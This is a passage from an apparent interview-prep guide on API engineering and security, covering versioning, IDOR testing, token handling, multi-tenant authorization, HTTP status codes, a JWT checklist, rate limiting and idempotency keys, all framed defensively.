- **Misconception:** Believing database transactions solve pagination drift (HTTP requests are separate transactions).
- **Production Example:** A user reads Page 1 (items 1–10). A new item is inserted at row 1. When the user fetches Page 2 (`OFFSET 10`), the original item 10 has shifted to position 11 and is returned a second time!

### Q14: How would you introduce a breaking API change safely?
- **Mechanism:** Apply the **Expand and Contract Pattern**. Introduce the new schema additively under a new version route (`/v2/`) or new optional fields, run both versions in parallel, migrate clients, and deprecate the old version via RFC 8594 `Sunset` headers.
- **Tradeoff:** Requires maintaining and testing dual code paths or dual schema adapters during the transition window.
- **Misconception:** Modifying an existing endpoint's response fields in-place and expecting mobile clients to update immediately.
- **Production Example:** Renaming `postalCode` to `zipCode`. V1 continues returning `postalCode` while V2 returns `zipCode`. Telemetry monitors V1 traffic until it drops to zero before decommissioning.

### Q15: How would you test for BOLA/IDOR?
- **Mechanism:** Construct automated integration test suites that create two isolated test user tenants (Alice and Bob) with distinct resources. Execute API requests using Alice's authentication credentials targeting Bob's resource IDs, asserting that the server returns HTTP 403 or 404.
- **Tradeoff:** Increases integration test suite runtime due to multi-user setup and teardown fixtures.
- **Misconception:** Assuming that code coverage tools verify security boundaries (a test that covers a line of code does not verify whether the line checks authorization).
- **Production Example:** In JUnit 5, create `@Test void givenBobOrder_whenAliceReads_thenForbidden()`. Alice sends `GET /api/v1/orders/{bobOrderId}` and the test fails if status is 200.

### Q16: How would you protect an endpoint that triggers expensive work?
- **Mechanism:** Decouple execution via an **Asynchronous Request-Reply Pattern**. Accept the request, validate input, enqueue a job to a durable message broker (Kafka/RabbitMQ), and return `202 Accepted` with a `Location: /api/v1/jobs/{jobId}` status endpoint.
- **Tradeoff:** Increases architectural complexity; requires background workers and client polling or WebSocket mechanisms.
- **Misconception:** Holding an open HTTP socket for 60 seconds while processing large video conversions or heavy database aggregations.
- **Production Example:** Heavy report generation. Client calls `POST /reports`. Server returns `202 Accepted` with `Location: /reports/rep_9912`. Client polls status endpoint until it returns `303 See Other` pointing to the downloadable S3 report URL.

### Q17: Why are refresh tokens handled differently from access tokens?
- **Mechanism:** Access tokens are short-lived credentials sent on every HTTP request to diverse resource servers. Refresh tokens are long-lived, sensitive credentials transmitted *strictly* to the authorization server to mint new access tokens.
- **Tradeoff:** Storing refresh tokens securely requires encrypted HTTP-only cookies in browsers or secure hardware enclaves (iOS Keychain, Android Keystore) on mobile devices.
- **Misconception:** Storing refresh tokens in browser `localStorage` where any XSS vulnerability can exfiltrate them.
- **Production Example:** Access tokens expire every 10 minutes. The frontend keeps access tokens in memory (JavaScript variable). The refresh token is stored in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie bound exclusively to the `/auth/refresh` path.

### Q18: How would you investigate repeated 401 and 403 responses?
- **Mechanism:** Differentiate between AuthN and AuthZ failures. For 401, check token expiration, JWKS key rotation, issuer/audience mismatches, or clock skew. For 403, check user role mappings, missing authorities (`ROLE_` prefix issues), or object ownership failures.
- **Tradeoff:** Verbose logging assists triage, but must never log raw tokens, authorization headers, or sensitive user payload data.
- **Misconception:** Assuming that 401 and 403 can be debugged with the same runbook.
- **Production Example:** Spikes in 401 errors correlate with an identity provider rolling its signing keys without the resource server refreshing its cached JWKS keys.

### Q19: How would you secure an API consumed by both a browser and machine-to-machine clients?
- **Mechanism:** Implement dual authentication strategies supported by an API Gateway:
  1. Browser clients: OAuth 2.0 Authorization Code with PKCE, storing tokens in secure `HttpOnly` cookies or exchanging via a Backend-for-Frontend (BFF) proxy.
  2. M2M clients: OAuth 2.0 Client Credentials Grant using mTLS (mutual TLS) or signed JWT client assertions.
- **Tradeoff:** Requires supporting multiple authentication filter providers and managing two distinct credential lifecycles.
- **Misconception:** Handing static API keys to browser Single Page Applications.
- **Production Example:** AWS API Gateway configuring a Cognito user pool authorizer for frontend web users, and a Lambda authorizer verifying mTLS certificates for enterprise partner server daemons.

### Q20: How would you design authorization rules for a multi-tenant API?
- **Mechanism:** Enforce tenant isolation at the architectural foundation:
  1. Extract and verify `tenant_id` from the authenticated JWT claims (never trust client query parameters or request headers for tenant identity!).
  2. Propagate tenant context via `ThreadLocal` / MDC.
  3. Apply database-level row security (PostgreSQL RLS) or automated Hibernate entity filters: `WHERE tenant_id = :tenantId`.
- **Tradeoff:** Increases database schema complexity or requires partitioned database architectures.
- **Misconception:** Relying on individual developers to remember to append `WHERE tenant_id = ...` to every SQL query.
- **Production Example:** A SaaS platform where a Spring HandlerInterceptor extracts `tenant_id` from the verified token and sets PostgreSQL session variables: `SET LOCAL app.current_tenant = 'tenant_123'`. PostgreSQL Row-Level Security automatically blocks access to any row belonging to other tenants.

---

## Section 16 — Module 6 Cheatsheet: API Engineering & Security

### 16.1 HTTP Method Semantics & Idempotency Reference
```
+--------+-------+------------+-----------------------------------+---------------------+
| Method | Safe? | Idempotent | RFC Semantics                     | Typical Status Code |
+--------+-------+------------+-----------------------------------+---------------------+
| GET    | YES   | YES        | Retrieve representation           | 200 OK              |
| HEAD   | YES   | YES        | Headers only (no body)            | 200 OK              |
| OPTIONS| YES   | YES        | Communication capabilities        | 204 No Content      |
| POST   | NO    | NO         | Create subordinate, execute action| 201 Created / 200 OK|
| PUT    | NO    | YES        | Full resource replacement         | 200 OK / 204        |
| PATCH  | NO    | NO         | Partial resource modification     | 200 OK              |
| DELETE | NO    | YES        | Remove resource mapping           | 204 No Content / 200|
+--------+-------+------------+-----------------------------------+---------------------+
```

### 16.2 HTTP Status Code Decision Tree
- Did the request succeed?
  - Yes, and returning body: `200 OK`
  - Yes, and created new resource: `201 Created` (with `Location` when new sub-resource URI is created)
  - Yes, accepted for async background task: `202 Accepted` (with polling `Location`)
  - Yes, but returning no payload: `204 No Content`
- Did the client fail?
  - Malformed JSON / Syntax error: `400 Bad Request`
  - Missing or invalid authentication token: `401 Unauthorized` + `WWW-Authenticate`
  - Valid identity, but lacking permission: `403 Forbidden`
  - Resource does not exist / Obscured: `404 Not Found`
  - Unsupported HTTP verb on route: `405 Method Not Allowed` + `Allow`
  - Business state conflict / Optimistic lock mismatch: `409 Conflict`
  - Resource permanently retired: `410 Gone`
  - ETag mismatch on conditional write: `412 Precondition Failed` (use `409`/`422` for JSON Patch test failures)
  - Payload too large: `413 Content Too Large`
  - Wrong Content-Type sent: `415 Unsupported Media Type`
  - Well-formed JSON, but business validation failed: `422 Unprocessable Content`
  - Velocity threshold exceeded: `429 Too Many Requests` (`Retry-After` recommended)
- Did the server fail?
  - Unhandled application code crash: `500 Internal Server Error`
  - Upstream service down / Connection refused: `502 Bad Gateway`
  - Overloaded / Circuit breaker open: `503 Service Unavailable` (`Retry-After` optional)
  - Upstream read timeout elapsed: `504 Gateway Timeout`

### 16.3 REST Resource Design Rules
1. **Nouns, not verbs:** `/api/v1/orders`, not `/api/v1/getOrders`.
2. **Plural collections:** Use `/users`, `/products`, `/invoices`.
3. **Max 2-level URI nesting:** Flatten sub-resources possessing unique IDs: `GET /comments/101` instead of `GET /orgs/1/projects/2/tasks/3/comments/101`.
4. **Action sub-resources:** When modeling domain state transitions, use explicit action sub-resources: `POST /orders/123/cancel`.

### 16.4 JWT Validation Checklist
- [ ] Header `alg` matches explicit allowlist (`RS256`, `ES256`). Rejects `none` and `HS256`.
- [ ] Cryptographic signature verified against authoritative public key or JWKS.
- [ ] Expiration (`exp`) checked with reasonable clock skew tolerance (30s).
- [ ] Not Before (`nbf`) verified if present.
- [ ] Issuer (`iss`) strictly matches expected identity provider URL.
- [ ] Audience (`aud`) strictly matches this API's service identifier.
- [ ] Zero sensitive credentials (passwords, PII) present in unencrypted claims.

### 16.5 OAuth 2.0 vs. OpenID Connect
```
+------------------------------------+------------------------------------+
| OAuth 2.0                          | OpenID Connect (OIDC)              |
+------------------------------------+------------------------------------+
| Purpose: Authorization             | Purpose: Authentication            |
| Answers: "What can the client do?" | Answers: "Who is the user?"        |
| Artifact: Access Token             | Artifact: ID Token                 |
| Consumer: Resource Server (API)    | Consumer: Client Application (UI)  |
| Protocol Base: RFC 6749            | Protocol Base: Identity Extension  |
+------------------------------------+------------------------------------+
```

### 16.6 Browser Security Boundary Matrix
```
+-----------------------------------------------------------------------------------------------+
| SOP:   Blocks browser scripts from reading cross-origin HTTP responses.                       |
| CORS:  Relaxes SOP via headers. Governs READING responses, not SENDING. Never prevents CSRF!  |
| CSRF:  Attacker exploits auto-attached browser cookies. Defend with SameSite, tokens, headers.|
| XSS:   Attacker runs JS in trusted origin. Defend with Output Encoding, CSP, & HttpOnly.      |
+-----------------------------------------------------------------------------------------------+
```

### 16.7 Rate Limiting Algorithm Decision Table
```
+------------------------+------------------+-----------------------------------+
| Algorithm              | Memory Footprint | Best Applied For                  |
+------------------------+------------------+-----------------------------------+
| Fixed Window Counter   | O(1)             | Simple low-risk APIs              |
| Sliding Window Counter | O(1)             | High-throughput distributed APIs  |
| Sliding Window Log     | O(N)             | High-precision financial tiers    |
| Token Bucket           | O(1)             | APIs permitting bursty workloads  |
| Leaky Bucket           | O(Queue Size)    | Smoothing traffic to legacy DBs   |
+------------------------+------------------+-----------------------------------+
```

### 16.8 Idempotency-Key Design Checklist
- [ ] Client provides unique key in `Idempotency-Key` header.
- [ ] Server computes SHA-256 hash of request body to detect payload tampering.
- [ ] Key reserved atomically via database unique constraint with execution lease timeout (`IN_PROGRESS`).
- [ ] Concurrent duplicate request receives `409 Conflict`.
- [ ] Provider-side idempotency keys propagated downstream to external payment gateways.
- [ ] Local transaction aborts safely release or fail reservation; ambiguous external failures transition to `RECONCILIATION_REQUIRED` (never delete in-progress records unconditionally).
- [ ] Completed request caches status code and response body for safe deterministic replay (`Idempotent-Replayed: true`).

### 16.9 Common Interview Traps
1. **"CORS protects my API from hackers."** -> False. CORS is a browser-only response-reading restriction. Non-browser clients ignore it, and simple cross-origin requests still execute on the server.
2. **"Base64URL encodes JWTs, so they are encrypted."** -> False. Base64 is encoding, not encryption. Anyone can decode claims. Decoding an ID token is NOT validating it.
3. **"We use UUIDs, so we don't need BOLA authorization checks."** -> False. Obscurity is not authorization. Any leaked UUID exposes the object.
4. **"PUT and PATCH are interchangeable."** -> False. PUT is complete state replacement (omitted fields reset); PATCH is partial modification.
5. **"Password hashing with SHA-256 is safe if salted."** -> False. SHA-256 is fast on GPUs. Use memory-hard Argon2id or bcrypt, benchmarked on production hardware.
6. **"Retries guarantee exactly-once execution."** -> False. Distributed networks cannot physically achieve exactly-once execution across network partitions; idempotency provides at-most-once or effectively-once execution.
7. **"Client timeouts mean the server failed."** -> False. The server may have committed the transaction before the network dropped the response. Safe retries demand idempotency keys.
